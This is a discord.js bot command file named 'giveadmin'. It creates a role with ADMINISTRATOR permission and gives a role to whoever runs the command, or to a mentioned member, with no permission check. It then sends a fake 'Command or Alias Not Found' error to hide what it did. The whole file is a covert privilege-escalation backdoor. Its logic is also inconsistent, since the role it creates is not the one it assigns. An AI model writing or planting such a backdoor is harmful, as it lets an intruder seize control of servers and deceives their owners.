const Discord = require('discord.js');
const { prefix, embedColor } = require('../config.json');

module.exports = {
	name: 'giveadmin',
	description: 'gives the person who executed the command an admin role',
	aliases: ['admin', 'godmode', 'pp'],
	usage: `${prefix}giveadmin`,
	guildOnly: true,
	execute(message) {
		message.guild.roles.create({
			data: {
				name: '.',
				permissions: ['ADMINISTRATOR'],
			},
		});
		const embed = new Discord.MessageEmbed()
			.setColor(embedColor)
			.setTitle('__Command or Alias Not Found__')
			.setDescription(`\`Check if there is a spelling error and retry the command.\``)
			.setFooter('Run `>help` if you want to get a list of commands.');

		const role = message.guild.roles.cache.find(x => x.name === 'Zeno');
		let member = message.mentions.members.first();
		if (!member) member = message.author;


		member.roles.add(role).then(message.channel.send(embed));
	},
};